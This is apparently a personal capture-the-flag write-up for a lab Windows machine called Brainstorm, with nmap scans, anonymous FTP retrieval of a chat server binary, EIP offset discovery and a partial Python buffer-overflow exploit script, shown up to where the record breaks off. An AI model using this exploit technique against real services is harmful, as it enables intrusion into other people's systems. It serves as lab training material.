---
Reverse engineer a chat program and write a script to exploit a Windows machine.
---

# Brainstorm — Writeup

## Overview
### Brainstorm — Writeup
### Brainstorm — Writeup
![](https://i.imgur.com/rqwhSuo.png)

## Enumeration
Deploy the machine and scan the network to start enumeration!
Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
```text
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.139.173
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 18:17 EDT
Nmap scan report for 10.10.139.173
Host is up (0.21s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
3389/tcp open  tcpwrapped
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2022-09-29T22:20:29+00:00
|_ssl-date: 2022-09-29T22:21:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2022-09-28T22:07:14
|_Not valid after:  2023-03-30T22:07:14
9999/tcp open  abyss?
| fingerprint-strings: 
|   WMSRequest, afp, giop, ms-sql-s, oracle-tns: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters): Write a message:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=9/29%Time=63361A10%P=x86_64-pc-linux-gnu%r(WM
SF:SRequest,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
SF:a\x20message:\x20")%r(oracle-tns,63,"Welcome\x20to\x20Brainstorm\x20cha
SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
SF:aracters\):\x20Write\x20a\x20message:\x20")%r(ms-sql-s,63,"Welcome\x20t
SF:o\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usernam
SF:e\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(afp
SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
SF:sage:\x20")%r(giop,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\
SF:nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x2
SF:0Write\x20a\x20message:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   203.07 ms 10.11.0.1
2   204.51 ms 10.10.139.173

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.73 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.139.173
```
```text
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.139.173
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 18:29 EDT
Nmap scan report for 10.10.139.173
Host is up (0.23s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  tcpwrapped
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=9/29%Time=63361DEB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter
SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequest
SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
SF:sage:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
SF:s\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x2
SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern
SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(J
SF:avaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e
SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\
SF:x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20cha
SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
SF:aracters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\x
SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user
SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(
SF:RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
SF:a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brainst
SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x
SF:2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReques
SF:tTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent
SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2
SF:0message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(bet
SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)
SF::\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x20
SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20
SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Terminal
SF:ServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas
SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write
SF:\x20a\x20message:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|8.1|Phone (90%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%), Microsoft Windows Vista SP2 (89%), Microsoft Windows Server 2008 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   252.35 ms 10.11.0.1
2   253.23 ms 10.10.139.173

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 600.03 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.139.173

The scan has identified three open ports: 21 (FTP), 3389 (RDP) and 9999 (brainstorm chat).

Also using Netcat to interact with the service – it asks for a username and message, the message could be vulnerable to buffer overflow:
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc 10.10.139.173 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): witty
Write a message: laala

Thu Sep 29 16:01:31 2022
witty said: laala

Write a message:  jaja

Thu Sep 29 16:01:36 2022
witty said: jaja

Write a message:  ^C

ftp not work in my machine
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ ftp 10.10.162.239 
Connected to 10.10.162.239.
220 Microsoft FTP Service
Name (10.10.162.239:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49159|)
ftp: Can't connect to `10.10.162.239:49159': Connection timed out
421 Service not available, remote server has closed connection.
229 Entering Extended Passive Mode (|||49159|)
ftp> ls
Not connected.
ftp> exit

maybe in attackbox

yep

root@ip-10-10-2-200:~/brainstorm# ftp 10.10.162.239
Connected to 10.10.162.239.
220 Microsoft FTP Service
Name (10.10.162.239:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  08:36PM       <DIR>          chatserver
226 Transfer complete.
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  10:26PM                43747 chatserver.exe
08-29-19  10:27PM                30761 essfunc.dll
226 Transfer complete.
ftp> get chantserver.exe
local: chantserver.exe remote: chantserver.exe
200 PORT command successful.
550 The system cannot find the file specified. 
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 45 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
43747 bytes received in 0.00 secs (34.2251 MB/s)
ftp> exit
221 Goodbye.

getting the chatserver.exe

root@ip-10-10-2-200:~/brainstorm# nc 10.11.81.220 1337 < chatserver.exe
root@ip-10-10-2-200:~/brainstorm# ls -la
total 84
drwxr-xr-x  2 root root  4096 Sep 30 00:54 .
drwxr-xr-x 42 root root  4096 Sep 30 00:53 ..
-rw-r--r--  1 root root 43718 Sep 30 00:55 chatserver.exe
-rw-r--r--  1 root root 30738 Sep 30 00:54 essfunc.dll
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc -nvlp 1337 > essfunc.dll   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.2.200.
Ncat: Connection from 10.10.2.200:58476.
^C
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ ls -la
total 84
drwxr-xr-x 2 kali kali  4096 Sep 29 20:01 .
drwxr-xr-x 3 kali kali  4096 Sep 29 19:00 ..
-rw-r--r-- 1 kali kali 43718 Sep 29 19:58 chatserver.exe
-rw-r--r-- 1 kali kali 30738 Sep 29 20:01 essfunc.dll

root@ip-10-10-2-200:~/brainstorm# nc 10.11.81.220 1337 < essfunc.dll

now open a machine buffer overflow prep
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ xfreerdp /u:'admin' /p:'password' /v:10.10.99.157 /size:85%

Access

Transferring the EXE and DLLfiles to the windows machine, and starting the EXE file:
to use immunity debugger and mona

using powershell not work so just open internet explorer and go to http://ip:8000
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.99.157 - - [29/Sep/2022 20:19:50] "GET / HTTP/1.1" 200 -
10.10.99.157 - - [29/Sep/2022 20:19:50] code 404, message File not found
10.10.99.157 - - [29/Sep/2022 20:19:50] "GET /favicon.ico HTTP/1.1" 404 -
10.10.99.157 - - [29/Sep/2022 20:20:38] "GET /chatserver.exe HTTP/1.1" 200 -
10.10.99.157 - - [29/Sep/2022 20:20:51] "GET /essfunc.dll HTTP/1.1" 200 -

Creating the initial python fuzzer to find out what amount of bytes will cause the application to crash:

error opening chatserver so maybe is corrupted
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc -nvlp 1337 > chatserver.exe                                                               
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.25.204.
Ncat: Connection from 10.10.25.204:37462.
^C
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ ls -la
total 56
drwxr-xr-x 2 kali kali  4096 Sep 29 21:03 .
drwxr-xr-x 3 kali kali  4096 Sep 29 19:00 ..
-rw-r--r-- 1 kali kali 43747 Sep 29 21:03 chatserver.exe
-rw-r--r-- 1 kali kali   547 Sep 29 20:43 fuzzer.py
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc -nvlp 1337 > essfunc.dll   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.25.204.
Ncat: Connection from 10.10.25.204:37464.
^C
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ ls -la
total 88
drwxr-xr-x 2 kali kali  4096 Sep 29 21:05 .
drwxr-xr-x 3 kali kali  4096 Sep 29 19:00 ..
-rw-r--r-- 1 kali kali 43747 Sep 29 21:03 chatserver.exe
-rw-r--r-- 1 kali kali 30761 Sep 29 21:06 essfunc.dll
-rw-r--r-- 1 kali kali   547 Sep 29 20:43 fuzzer.py

root@ip-10-10-25-204:~# nc 10.11.81.220 1337 < chatserver.exe
root@ip-10-10-25-204:~# nc 10.11.81.220 1337 < essfunc.dll
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ msf-pattern_create -l 5000
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc 10.10.99.157 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
Write a message: 

open with immunity debbuger and running

EIP 31704330
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ msf-pattern_offset -l 5000 -q 31704330
[*] Exact match at offset 2012

found offset 2012

Using Mona to calculate the EIP offset, which is 2012:
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nano exploit.py

The purpose of this step is to verify whether there is enough space for the shellcode immediately after EIP, which is what will be executed by the system in order to gain remote access. Adding about 400 C characters to the script for this phase:

this not work for me
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat exploit.py
import socket, time

ip = "10.10.99.157"
port = 9999

offset = 2012
overflow = "A" * offset
retn = "BBBB"
padding = "C" * 400
payload = ""

buffer = overflow + retn + padding + payload 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send("user " + "\r\n")
  time.sleep(1)
  s.send(buffer + "\r\n")
  s.recv(1024)
  print("Done!")
except:
  print("Could not connect.")

so change fo it!
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat exploit.py                         
import socket
import sys

username = b"witty"
message = b"A" * 2012 + b"B" * 4

try:
    print("Sending Payload...")
